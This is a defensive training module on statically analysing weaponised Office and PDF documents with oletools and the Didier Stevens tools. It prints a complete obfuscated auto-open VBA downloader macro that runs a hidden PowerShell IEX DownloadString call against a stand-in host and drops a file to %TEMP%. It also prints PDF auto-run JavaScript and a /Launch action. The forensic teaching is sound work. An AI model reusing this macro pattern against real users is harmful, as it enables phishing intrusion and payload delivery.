# Module 14 — Malicious Document Analysis (oletools + the Didier Stevens suite)

**Deck mapping:** *Intrusion Hunting Playbook* → "Initial Access / Phishing Attachments" · *Advanced Intrusion Forensic Hunting* → "Weaponised Documents (Office macros & PDF)."
**Goal:** take a suspicious **Office document** and a suspicious **PDF**, and — **without ever opening them in Office or a reader** — prove whether they are weaponised, read exactly what they would do, and extract the next-stage indicators (URLs, dropped file names, launched programs). You will use **oletools** (`oleid`, `olevba`) and the **Didier Stevens suite** (`oledump`, `pdfid`, `pdf-parser`, `zipdump`).

> **Middle-earth framing.** This is the **front door** of **SAURON / APT-MORDOR**'s breach of **Middle-earth Holdings** — the phishing attachment that, in the realm's story, lands on patient zero `BAG-END-LT01` (`frodo.baggins`) before `theonering.exe` ever drops (canon: [`../THEME-MIDDLE-EARTH.md`](../THEME-MIDDLE-EARTH.md)). The three samples are **benign teaching files built for this module**, and the tool output below is the **real** parse of those exact bytes — so the filenames and the inert `example.test` lure you see (`Invoice_2024_0042.doc`, `update.ps1`, …) are reported **as-is**, never swapped for themed names.

> **Prerequisite:** none beyond the lab VM. This is the "front door" module — most intrusions begin here, and the IOCs you carve feed Module 9 (did the macro's PowerShell actually run? check 4104) and the malware-triage flow (YARA/capa/FLOSS on the dropped payload).
>
> **Everything below was produced by running the named commands against the three bundled samples on the lab VM.** The samples are **benign teaching files built for this module** (see `data/README.md`); they contain realistic *indicators* but **no working payload** — the "download" host is the RFC-6761 reserved, non-routable domain `example.test`, and nothing is ever executed because every tool here is a **static** parser.

---

## 1. Background — why this matters

### Why documents are the #1 way in
A user who would never run `evil.exe` will happily open `Invoice_2024_0042.doc`. For years the most common first step of a real intrusion has been a **phishing attachment**: an Office file with a macro, or a PDF with an auto-running action. The document itself is rarely the malware — it is the **launcher**. It runs a tiny bit of code that reaches out to the internet and pulls down the real payload. Your job in this module is to read that launcher and answer three questions:

1. **Is it weaponised** (does it contain code that runs on open)?
2. **What does it do** (shell out? download? launch a program?)
3. **What is the next stage** (which URL, which dropped file) so you can sweep the rest of the estate for it?

You answer all three **statically** — by parsing the file's bytes — so nothing detonates.

### How an Office document is built (plain language)
There are two container shapes, and you must recognise which you have:

- **Legacy / OLE2** (`.doc`, `.xls`, `.ppt`): a single file that is really a tiny **filesystem inside a file** — the **OLE2 Compound File** format. It has "storages" (folders) and "streams" (files). VBA macros live in a storage called `VBA`, and the macro source is **compressed** inside a stream. `Invoice_2024_0042.doc` is this shape.
- **Modern / OOXML** (`.docx`, `.docm`, `.xlsx`, `.xlsm`): a **ZIP archive of XML parts**. A macro-enabled one (`.docm`/`.xlsm`) contains one extra part, `word/vbaProject.bin` (or `xl/vbaProject.bin`) — and *that part is itself an OLE2 file* with the same `VBA` storage inside it. `Statement_Q4.docm` is this shape (it wraps the very same VBA project as the `.doc`).

So the modern format is just **a ZIP with an OLE2 file inside it**. That is why you need a ZIP tool (`zipdump`) *and* an OLE tool (`oledump`) to reach the macro in a `.docm`.

The macro itself is **VBA** (Visual Basic for Applications). The bytes that matter:
- **Auto-exec triggers** — `AutoOpen`, `Document_Open` (Word), `Workbook_Open` (Excel). These run **the moment the file opens**, with no further clicks. Always look for these first.
- **Execution APIs** — `Shell`, `WScript.Shell.Run`, `CreateObject(...)`, or a declared Win32 API like `URLDownloadToFileA`. This is *how* it acts.
- **The payload string** — usually a `powershell ...` command line that downloads and runs the next stage. Often **obfuscated** (built from `Chr()` character codes, `StrReverse`, string concatenation) so it is not obvious in plain text.

### How a PDF is built (plain language)
A PDF is a set of numbered **objects** (`N 0 obj … endobj`) referenced through a **cross-reference table**. A handful of object keywords are dangerous because they cause code to run or a program to start:

- **`/OpenAction`** and **`/AA`** (Additional Actions) — run something **automatically** when the document (or a page) opens. Auto-exec, exactly like `AutoOpen`.
- **`/JavaScript`** and **`/JS`** — embedded JavaScript (PDF readers have a scripting engine). The classic carrier for reader exploits and for "click OK to view" social engineering.
- **`/Launch`** — start an **external program** (`cmd.exe`, `calc.exe`, …).
- **`/URI`** — an external link (phishing / tracking / drive-by).
- **`/EmbeddedFile`, `/RichMedia`** — a packaged payload or Flash/media exploit carrier.

Object **streams** (the JavaScript, for instance) are usually **compressed** with `FlateDecode` (zlib), so a raw view shows gibberish — you must ask the parser to *decode* the stream to read the script.

### The static-analysis mindset
None of the tools below run the macro or the JavaScript. They **parse and decode**. That is what makes maldoc analysis safe and **reproducible** — the same bytes give the same answer every time, which matters for an investigation report. You still do the work **offline** (the lab VM has no network), because you will be carving live payload URLs and (in real cases) live droppers.

---

## 2. What the tools do

| Tool | Suite | One-line job |
|---|---|---|
| **`oleid`** | oletools | 30-second **triage** of an Office file: macros? encrypted? external links? with a **risk level**. Run it first. |
| **`olevba`** | oletools | the **macro workhorse** — extracts the VBA source and runs a keyword/IOC scanner that flags auto-exec, suspicious APIs, and obfuscation; can **deobfuscate** and **reveal** the real strings. |
| **`oledump`** | Didier Stevens | **OLE stream surgery** — lists the streams, marks which hold a macro (`M`), and **decompresses** the one you pick. Plus plugins (e.g. HTTP-heuristics). |
| **`zipdump`** | Didier Stevens | inspect a **ZIP/OOXML** (`.docm`/`.xlsm`) without unzipping to disk, and **pipe** a member (the `vbaProject.bin`) straight into `oledump`. |
| **`pdfid`** | Didier Stevens | PDF **triage** — counts the dangerous keywords (`/JavaScript`, `/OpenAction`, `/Launch`, …). |
| **`pdf-parser`** | Didier Stevens | PDF **deep dive** — show any object, follow references, and **decode** (decompress) a stream to read the embedded JavaScript or payload. |
| **`rtfobj`** | oletools | parse **RTF** and extract embedded OLE objects (the Equation-Editor / CVE-2017-11882 carrier). Covered conceptually here; see `research/oletools.md`. |

**Triage with `oleid`/`pdfid`, then dissect with `olevba`/`oledump` and `pdf-parser`.**

---

## 3. Setup

Open **Git Bash** on the lab VM and change into this module's data directory:

```bash
cd module-14-malicious-documents/data
```
- **`cd module-14-malicious-documents/data`** — move into the folder holding this module's three samples. **Every command below is run from inside this folder**, so files are named with simple relative paths and any output lands right beside them.
- All the document-analysis tools (`oleid`, `olevba`, `oledump`, `zipdump`, `pdfid`, `pdf-parser`, `rtfobj`) are installed **natively on the lab VM and already on your `PATH`** — call them directly by name in Git Bash; there is no container or Docker. The VM is kept **offline** (no network): the samples are inert, but staying offline is the habit you want when handling real maldocs — even though these tools never execute the file, you never want a stray click or a second-stage fetch to reach the internet from your analysis box.

Tool versions on the lab VM (verified 2026-06-29): **olevba 0.60.2**, **oleid 0.60.1**, **rtfobj 0.60.1** (oletools); **oledump 0.0.85**, **pdfid 0.2.10**, **pdf-parser 0.7.14**, **zipdump 0.0.35** (Didier Stevens). On the lab VM the Didier tools are exposed **without the `.py` suffix** (`pdfid`, not `pdfid.py`).

---

## 4. Part A — the Office macro document (`Invoice_2024_0042.doc`)

### Step A1 — Triage with `oleid`
Always start with the cheap question: *is this thing worth a deep dive?*

```bash
oleid Invoice_2024_0042.doc
```
`oleid` takes just the filename — it walks the OLE structure and reports a table of indicators with a **Risk** column. Real output (abridged):

```
Indicator           |Value               |Risk      |Description
File format         |Generic OLE file    |info      |Unrecognized OLE file.
Container format    |OLE                 |info      |Container type
Encrypted           |False               |none      |The file is not encrypted
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA macros.
                    |                    |          |Suspicious keywords were found.
                    |                    |          |Use olevba and mraptor for more info.
XLM Macros          |No                  |none      |This file does not contain Excel 4/XLM macros.
External            |0                   |none      |External relationships such as remote
Relationships       |                    |          |templates, remote OLE objects, etc
```
**Reading it:** `VBA Macros = Yes, suspicious — HIGH`. That single line is your green light to dig. (`oleid` says *"Generic OLE file"* because this teaching sample is a minimal OLE2 VBA container rather than a full Word document — the macro is all that matters here, and `oleid` still finds it.) The `Encrypted = False` and `External Relationships = 0` rule out two common evasions (a flagged-but-unreadable encrypted doc, or a remote-template fetch).

### Step A2 — Extract & scan the macro with `olevba`
```bash
olevba -a Invoice_2024_0042.doc
```
- `-a` / `--analysis` — print **only the analysis table** (the IOC/keyword findings). Drop `-a` to also dump the full source; use `-c` for source-only.

Real analysis table:

```
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document...  |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Shell               |May run an executable file or a system command|
|Suspicious|vbHide              |May run an executable file or a system command|
|Suspicious|WScript.Shell       |May run an executable file or a system command|
|Suspicious|run                 |May run an executable file or a system command|
|Suspicious|powershell          |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|New-Object          |May create an OLE object using PowerShell    |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|URLDownloadToFileA  |May download files from the Internet         |
|Suspicious|Net.WebClient       |May download files from the Internet using PS|
|Suspicious|DownloadString      |May download files from the Internet using PS|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|IOC       |update.ps1          |Executable file name                         |
|IOC       |svchost_update.ps1  |Executable file name                         |
+----------+--------------------+---------------------------------------------+
```
**Reading it — this is the whole skill:**
- **`AutoExec` rows** (`AutoOpen`, `Document_Open`) = the macro runs **the instant the file opens**. No further user action.
- **`Suspicious` rows** = *how* it acts: `Shell` + `WScript.Shell` + `run` (it shells out), `powershell` + `New-Object` + `Net.WebClient` + `DownloadString` (it runs a PowerShell downloader), `URLDownloadToFileA` + `Lib` (a declared Win32 download API as a backup), `Environ` (reads `%TEMP%` to choose a drop path), and crucially `Chr` + `StrReverse` (**the code is obfuscated** — the real strings are built at runtime).
- **`IOC` rows** = concrete artefacts to sweep for: a dropped `update.ps1` / `svchost_update.ps1`.

The pattern **AutoExec + Shell/PowerShell + download + obfuscation** is the textbook downloader maldoc. Now read what it actually does.

### Step A3 — Read the de-obfuscated macro with `olevba --reveal`
```bash
olevba --reveal Invoice_2024_0042.doc
```
- `--reveal` — print the macro source with obfuscated strings shown in context (the cleanest way to *read intent*). Related: `--deobf` (aggressive decode pass), `-c` (source only), `--show-pcode` (disassemble the compiled p-code — use this to catch **VBA stomping**, where the readable source is a decoy and the real logic is in the p-code).

The revealed source (abridged to the payload):

```vba
Sub AutoOpen()
    InitDocument
End Sub
Sub Document_Open()
    InitDocument
End Sub

Sub InitDocument()
    ' "powershell" assembled from character codes (string obfuscation)
    app = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & _
          Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)
    host = "http://www" & "." & "example" & "." & "test/inv/update.ps1"
    dest = Environ("TEMP") & "\svchost_update.ps1"
    flags = StrReverse("ssapyb pe neddih w- pon-")        ' -> -nop -w hidden -ep bypass
    payload = app & " " & flags & " -c ""IEX (New-Object " & _
        "Net.WebClient).DownloadString('" & host & "')"""
    Shell payload, vbHide                                  ' execution path 1
    CreateObject("WScript.Shell").Run payload, 0, False    ' execution path 2
    URLDownloadToFileA 0, host, dest, 0, 0                 ' backup: drop to %TEMP%
    CreateObject("WScript.Shell").Run "wscript " & dest, 0, False
End Sub
```
Now the story is unambiguous: on open it **rebuilds `powershell` from `Chr()` codes**, **reverses** its flags (`StrReverse` → `-nop -w hidden -ep bypass`), **concatenates** the URL (so a naïve string search for the full URL fails), and runs an `IEX … DownloadString(...)` one-liner to fetch and execute the next stage — with a backup that drops the script to `%TEMP%\svchost_update.ps1` and launches it. The decoy `host` is `www.example.test` (inert).

### Step A4 — Cross-check with `oledump` (and pull the URL with a plugin)
`olevba` is automated; `oledump` gives you the **raw OLE structure** and a clean decompress — useful to confirm findings and to reach things `olevba` summarises.

```bash
oledump Invoice_2024_0042.doc
```
Lists every stream; an **`M`** marks a stream that contains real macro code:

```
  1:        96 'PROJECT'
  2:        18 'PROJECTwm'
  3: M    5066 'VBA/Module1'
  4:        40 'VBA/_VBA_PROJECT'
  5:       272 'VBA/dir'
```
Stream **3** is the macro. Decompress just it:

```bash
oledump -s 3 -v Invoice_2024_0042.doc
```
- `-s 3` — **select** stream 3 (`-s a` = all streams).
- `-v` — **decompress** the VBA (the compressed stream → readable source). Without `-v` you would dump the raw compressed bytes.

Output is the same source you revealed in A3, byte-for-byte. Finally, let a plugin do the IOC pull:

```bash
oledump -p plugin_http_heuristics Invoice_2024_0042.doc
```
- `-p PLUGIN` — run a Didier Stevens **plugin** across the streams. `plugin_http_heuristics` reconstructs and prints URL-ish strings. Real output (abridged):

```
  3: M    5066 'VBA/Module1'
               Plugin: HTTP Heuristics plugin
                 http://www
```
Note it surfaces `http://www` — the *prefix* of the concatenated URL. That is a teaching point in itself: **string concatenation (`"http://www" & "." & "example" …`) deliberately breaks a single literal**, so a heuristic that keys on contiguous bytes only recovers a fragment. The reliable read is the **revealed source** in A3, where you see the whole thing assembled.

---

## 5. Part B — the modern Office path (`Statement_Q4.docm`, OOXML)

`Statement_Q4.docm` carries the **same VBA project** as Part A, but in the modern **OOXML (ZIP)** container. You cannot point `oledump` at it directly — first you must reach the `vbaProject.bin` *inside the ZIP*.

### Step B1 — List the ZIP members with `zipdump`
```bash
zipdump Statement_Q4.docm
```
```
Index Filename                     Encrypted Timestamp
    1 [Content_Types].xml                  0 2024-11-04 09:00:00
    2 _rels/.rels                          0 2024-11-04 09:00:00
    3 word/document.xml                    0 2024-11-04 09:00:00
    4 word/_rels/document.xml.rels         0 2024-11-04 09:00:00
    5 word/vbaProject.bin                  0 2024-11-04 09:00:00
```
Member **5**, `word/vbaProject.bin`, is the OLE2 macro store. Its mere presence in a `.docx`/`.docm` already tells you the document is macro-enabled.

### Step B2 — Pipe the macro store straight into `oledump`
```bash
zipdump -s 5 -d Statement_Q4.docm | oledump
```
- `-s 5` — **select** member 5.
- `-d` — **dump** its raw bytes to stdout.
- piping into `oledump` (**with no filename argument**, so it reads stdin) gives you the stream listing of the `vbaProject.bin` **without ever writing it to disk**:

```
  3: M    5066 'VBA/Module1'
```
Then read the macro the same way, over the same pipe:

```bash
zipdump -s 5 -d Statement_Q4.docm | oledump -s 3 -v
```
→ prints the identical VBA source from Part A.

> **Tool gap worth knowing:** upstream Didier Stevens docs (and `research/didier-stevens-suite.md`) show piping with a `-` filename (`… | oledump -s 3 -v -`). On the lab VM's **oledump 0.0.85** the `-` argument fails with `Error: - is not a file.` — the working form is to pipe in **with no filename at all** (as above). `olevba` also handles OOXML natively, so `olevba -a Statement_Q4.docm` reaches the same macro in one step (it reports `Type: OpenXML`).

---

## 6. Part C — the malicious PDF (`Invoice_2024_0042.pdf`)

### Step C1 — Triage with `pdfid`
```bash
pdfid -n Invoice_2024_0042.pdf
```
- `-n` — hide zero-count keywords (cleaner). (`-e` shows *extra* keywords; `-f` forces parsing of a file not recognised as a PDF.)

```
PDFiD 0.2.10 Invoice_2024_0042.pdf
 obj                    8
 /Page                  1
 /JS                    2
 /JavaScript            3
 /AA                    1
 /OpenAction            1
 /Launch                1
 /URI                   2
```
**Reading it:** any non-zero `/JavaScript`, `/JS`, `/OpenAction`, `/AA`, or `/Launch` means *investigate*. Here you have **all of them**: JavaScript that runs **automatically** (`/OpenAction` + `/AA`) and a `/Launch` action that would start an external program. That is a weaponised PDF; go to `pdf-parser`.

### Step C2 — Follow the auto-action with `pdf-parser`
```bash
pdf-parser -s OpenAction Invoice_2024_0042.pdf
```
- `-s KEYWORD` — search for objects containing a name/keyword. Real output shows the document **Catalog** and where the auto-action points:

```
obj 1 0
 Type: /Catalog
  <<
    /Type /Catalog
    /Pages 2 0 R
    /OpenAction 4 0 R
    /Names << /JavaScript << /Names [ (AcmeBoot) 7 0 R ] >> >>
  >>
```
`/OpenAction 4 0 R` → the action is **object 4**. Show it:

```bash
pdf-parser -o 4 Invoice_2024_0042.pdf
```
- `-o N` — show **object N**.

```
obj 4 0
 Type: /Action
  << /Type /Action /S /JavaScript /JS 5 0 R >>
```
It is a **JavaScript action** whose script is in **object 5**.

### Step C3 — Decode the (compressed) JavaScript stream
```bash
pdf-parser -o 5 -f Invoice_2024_0042.pdf
```
- `-f` — **apply the stream filters** (here `FlateDecode`/zlib). **Without `-f` you would see compressed gibberish;** with it you read the script:

```
obj 5 0
 Contains stream
  << /Length 194 /Filter /FlateDecode >>
 b'// Acme Secure Reader bootstrap\n
   app.alert({cMsg: "This document is protected. Click OK to view it.", ...});\n
   var trackUrl = "http://www.example.test/track?doc=INV-2024-0042";\n
   app.launchURL(trackUrl, true);\n'
```
The JavaScript pops a lure dialog (`app.alert`) and calls **`app.launchURL`** to a tracking URL — your extracted **network IOC**. (`-d FILE` would *dump* the decoded stream to a file for hashing/scanning; `-w` raw; `--objstm` to also parse object-stream-hidden objects.)

### Step C4 — Read the `/Launch` action
```bash
pdf-parser -s Launch Invoice_2024_0042.pdf
```
```
obj 8 0
 Type: /Action
  << /Type /Action /S /Launch
     /Win << /F (calc.exe) /D (C:\Windows\System32) /P () >> >>
```
A `/Launch` action that starts **`calc.exe`** (the classic harmless stand-in for "an arbitrary program"). This object is wired to the **page's `/AA /O`** (additional action, "on open"), so it too fires automatically. A one-line inventory of every object and indicator:

```bash
pdf-parser -a Invoice_2024_0042.pdf
```
- `-a` — **stats**: object/type counts and a "Search keywords" tally (`/JS 2: 4, 7`, `/Launch 1: 8`, `/OpenAction 1: 1`, `/URI 1: 9`, …) — a fast map of *which object number* holds each indicator, so you know exactly where to point `-o`.

---

## 7. Reading the output — suspicious vs benign

| Signal | Benign | Suspicious |
|---|---|---|
| **`oleid` VBA Macros** | "No" | **"Yes, suspicious — HIGH"** |
| **`olevba` AutoExec** | none | `AutoOpen` / `Document_Open` / `Workbook_Open` present |
| **`olevba` Suspicious** | a lone `Environ` | `Shell` + `powershell`/`WScript.Shell.Run` + `DownloadString`/`URLDownloadToFileA` |
| **`olevba` obfuscation** | none | `Chr`, `StrReverse`, heavy `&` concatenation building commands |
| **`oledump` stream flag** | lowercase `m` (attributes only) or none | uppercase **`M`** (real macro code) |
| **`pdfid`** | all of `/JS /OpenAction /AA /Launch` = 0 | any of them non-zero |
| **`pdf-parser` action `/S`** | `/GoTo`, `/Named` | **`/JavaScript`**, **`/Launch`**, `/URI` reached from `/OpenAction` or `/AA` |
| **PDF stream** | text you can read raw | needs `-f` to decode, and the decoded script calls `app.launchURL`/`eval`/`unescape` |

The headline skill across both formats: **find the auto-exec trigger, then read the de-obfuscated/decoded code it runs.** Obfuscation and compression hide the *bytes*; the tools hand you the *intent*.

---

## 8. Investigative narrative — the story the evidence tells

A finance user reports two attachments from a "supplier," `Invoice_2024_0042.doc` and `Invoice_2024_0042.pdf`, plus a `Statement_Q4.docm`. You never open them; you parse them.

1. **The `.doc`** triages **HIGH** in `oleid` (VBA, suspicious). `olevba` shows **AutoOpen/Document_Open** + a **PowerShell `DownloadString` downloader**, with the command **obfuscated** by `Chr()`/`StrReverse`/concatenation. `olevba --reveal` (confirmed by `oledump -s 3 -v`) reads the assembled command and the next-stage URL/dropped path: `…/inv/update.ps1` → `%TEMP%\svchost_update.ps1`.
2. **The `.docm`** is the **same payload in modern clothing**: `zipdump` shows `word/vbaProject.bin`; piping it into `oledump` reveals the identical macro. (Lesson: `.docx`/`.docm` is a ZIP — reach the `vbaProject.bin` first.)
3. **The `.pdf`** triages dirty in `pdfid` (`/JavaScript`, `/OpenAction`, `/AA`, `/Launch`, `/URI`). `pdf-parser` walks `/OpenAction → object 4 (JS action) → object 5`, and `-f` **decodes** the compressed JavaScript to reveal an `app.launchURL` tracker; a separate **`/Launch`** action (wired to the page `/AA`) would start `calc.exe`.

**The pivot:** every extracted IOC — the staging URL, `update.ps1`/`svchost_update.ps1`, the PDF tracker URL — now becomes a sweep across the estate. Did the macro's PowerShell actually execute? That is a **4104 Script Block Logging** question → **Module 9**. Is the dropped script on disk anywhere? → the disk/timeline modules. **Documents are the launcher; the launcher names the next stage.**

---

## 9. Try-it-yourself exercises

1. **Triage first.** Run `oleid` on `Invoice_2024_0042.doc` and `pdfid -n` on `Invoice_2024_0042.pdf`. In one sentence each, state *why* each file warrants a deep dive (name the single most damning indicator).
2. **Obfuscation can't hide intent.** From `olevba --reveal`, write out — in plain text — the full PowerShell command the macro builds. Show how `Chr()`, `StrReverse`, and `&` concatenation each hid a piece of it.
3. **Same payload, two containers.** Prove `Statement_Q4.docm` carries the *same* macro as the `.doc`: list its members with `zipdump`, then `zipdump -s 5 -d … | oledump -s 3 -v`. Which member number is the `vbaProject.bin`, and why can't you run `oledump` on the `.docm` directly?
4. **`-f` is not optional.** Run `pdf-parser -o 5` **without** `-f`, then **with** `-f`. What changes, and what does that tell you about how PDFs store scripts?
5. **Follow the chain.** Using only `pdf-parser -a` and `-o`, trace the path `/OpenAction → … → the JavaScript`, *and* find the object number of the `/Launch` action. Which two indicators make this PDF "auto-exec"?
6. **Extract the IOCs.** List every network/file indicator from all three samples (URLs, dropped file names, launched program). For each, name the **next module** you would pivot to in order to prove it ran.

---

## 10. Key takeaways

- **Office and PDF documents are launchers, not malware** — they run a small auto-exec stub that fetches the real payload. Your job is to read the stub statically and extract the next stage.
- **Triage before you dissect:** `oleid` (Office) and `pdfid` (PDF) tell you in seconds whether to go deeper — look for **VBA Macros = suspicious/HIGH** and any non-zero **`/JavaScript` `/OpenAction` `/AA` `/Launch`**.
- **Find the auto-exec trigger first:** `AutoOpen`/`Document_Open`/`Workbook_Open` in VBA; `/OpenAction`/`/AA` in PDF. No trigger, far lower urgency.
- **Then read the de-obfuscated/decoded code:** `olevba --reveal` (and `oledump -s N -v`) for VBA; `pdf-parser -o N -f` for the compressed PDF script. Obfuscation hides bytes; these tools hand you intent.
- **Know your container:** legacy `.doc`/`.xls` are **OLE2** (use `oledump` directly); modern `.docm`/`.xlsm` are **ZIP** (use `zipdump` to reach `vbaProject.bin`, *then* `oledump`).
- **Watch the version quirks:** on the lab VM the Didier tools have **no `.py`**, and **oledump 0.0.85 won't take `-` as a stdin filename** — pipe in with no filename instead.
- **The output is IOCs.** Every URL, dropped file, and launched program you carve feeds the next module (did it run? → **Module 9 / 4104**) and the malware-triage flow (YARA/capa/FLOSS on the dropped payload).

---

## 11. Sources & further reading

- oletools — official wiki (per-tool usage for `olevba`, `oleid`, `rtfobj`, `oleobj`): https://github.com/decalage2/oletools/wiki
- Didier Stevens — tool blog & suite (`pdfid`, `pdf-parser`, `oledump`, `zipdump`, plugins, and many real maldoc/PDF walkthroughs): https://blog.didierstevens.com/ and https://github.com/DidierStevens/DidierStevensSuite
- SANS ISC diaries by Didier Stevens — step-by-step `pdfid → pdf-parser` and `oledump` analyses of real samples: https://isc.sans.edu/
- MITRE ATT&CK — **T1566.001** Spearphishing Attachment, **T1204.002** Malicious File, **T1137** Office template/macro persistence.
- **[MS-OVBA]** (VBA macro / `dir` stream & compression) and **[MS-CFB]** (the OLE2 Compound File) — the formats the tools parse; also the Adobe **PDF reference** for PDF object/action structure.
- CVE-2017-11882 (Equation Editor) — context for `rtfobj`'s `Equation.3` findings.
- Module research notes: `research/oletools.md` and `research/didier-stevens-suite.md` (every flag, with pitfalls).

See `data/README.md` for the exact provenance, license, and **build steps** of each bundled sample.

## Pivot
- A macro/JS that runs PowerShell → **Module 9 (PowerShell Tradecraft)**: did it execute? Read the **4104** script block.
- Carved URLs / dropped files → the **disk & timeline** modules to find the dropper on the host.
- Each extracted payload → the **YARA / capa / FLOSS** triage flow (`research/yara.md`, `research/capa.md`, `research/floss.md`).

---
*The "front door" module: where most intrusions begin, and where you name the next stage.*
